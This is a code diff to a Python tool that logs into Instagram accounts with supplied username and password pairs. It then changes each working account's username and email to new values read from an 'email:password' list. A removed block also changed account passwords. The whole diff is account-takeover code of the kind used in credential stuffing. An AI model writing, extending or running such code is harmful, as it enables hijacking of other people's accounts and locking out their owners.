@@ -27,11 +27,8 @@ def unsafe_check(inst_checker_ctx):
     open_func = inst_checker_ctx.open_func
     username = inst_checker_ctx.username
     password = inst_checker_ctx.password
-    email_iter = inst_checker_ctx.email_iter
     
     login_url = url_parse.urljoin(INSTAGRAM_URL, 'accounts/login/')
-    edit_url = url_parse.urljoin(INSTAGRAM_URL, 'accounts/edit/')
-    password_url = url_parse.urljoin(INSTAGRAM_URL, 'accounts/password/change/')
     login_ajax_url = url_parse.urljoin(INSTAGRAM_URL, 'accounts/login/ajax/')
     
     resp = open_func(
@@ -85,17 +82,33 @@ def unsafe_check(inst_checker_ctx):
         raise InstCheckerError('invalid answer format (#2)')
     
     inst_checker_ctx.is_auth = is_auth
+
+def unsafe_edit(inst_checker_ctx):
+    ua_name = inst_checker_ctx.ua_name
+    cookies = inst_checker_ctx.cookies
+    opener = inst_checker_ctx.opener
+    open_func = inst_checker_ctx.open_func
+    username = inst_checker_ctx.username
+    password = inst_checker_ctx.password
+    email_iter = inst_checker_ctx.email_iter
+    
+    edit_url = url_parse.urljoin(INSTAGRAM_URL, 'accounts/edit/')
     
     if email_iter is None or \
             not inst_checker_ctx.is_auth:
         return
     
-    csrftoken = cookies._cookies[INSTAGRAM_DOMAIN]['/']['csrftoken'].value
-    new_email = next(email_iter)
     new_username = '{}_1'.format(username)
-    new_password = '{}_1'.format(password)
+    new_email_line = next(email_iter)
+    new_email_line_split = new_email_line.split(sep=':')
     
-    print('***', new_email, new_username, new_password, '***')
+    if len(new_email_line_split) < 2:
+        raise InstCheckerError('invalid new_email_line')
+    
+    new_email = new_email_line_split[0]
+    new_email_password = new_email_line_split[1]
+    
+    print('***', new_username, new_email, '***')
     
     resp = open_func(
         opener,
@@ -145,57 +158,12 @@ def unsafe_check(inst_checker_ctx):
     
     inst_checker_ctx.new_username = new_username
     inst_checker_ctx.new_email = new_email
+    inst_checker_ctx.is_edit_begin = True
     
-    return
     
-    ##########################
-    ##########
     
-    csrftoken = cookies._cookies[INSTAGRAM_DOMAIN]['/']['csrftoken'].value
     
-    resp = open_func(
-        opener,
-        url_request.Request(
-            password_url,
-            headers={
-                'User-Agent': ua_name,
-            },
-        ),
-        timeout=REQUEST_TIMEOUT,
-    )
-    
-    if resp.getcode() != 200 or resp.geturl() != password_url:
-        raise InstCheckerError('fetch password_url error')
-    
-    print('***', 'fetch password_url OK', '***')
-    
-    csrftoken = cookies._cookies[INSTAGRAM_DOMAIN]['/']['csrftoken'].value
-    
-    resp = open_func(
-        opener,
-        url_request.Request(
-            password_url,
-            data=url_parse.urlencode({
-                'csrfmiddlewaretoken': csrftoken,
-                'old_password': password,
-                'new_password1': new_password,
-                'new_password2': new_password,
-            }).encode(),
-            headers={
-                'User-Agent': ua_name,
-                'Referer': password_url,
-            },
-        ),
-        timeout=REQUEST_TIMEOUT,
-    )
-    
-    print('*****', resp.geturl(), '*****')
-    
-    if resp.getcode() != 200 or resp.geturl() != password_url:
-        raise InstCheckerError('post password_url error')
-    
-    #inst_checker_ctx.new_password = new_password
-    
+    #inst_checker_ctx.is_edit = True
 
 def init_inst_checker_ctx(inst_checker_ctx, ua_name, username, password):
     cookies = cookiejar.CookieJar()
@@ -212,4 +180,7 @@ def init_inst_checker_ctx(inst_checker_ctx, ua_name, username, password):
     inst_checker_ctx.open_func = open_func
     inst_checker_ctx.username = username
     inst_checker_ctx.password = password
+    inst_checker_ctx.is_auth = None
     inst_checker_ctx.email_iter = None
+    inst_checker_ctx.is_edit_begin = False
+    inst_checker_ctx.is_edit = False
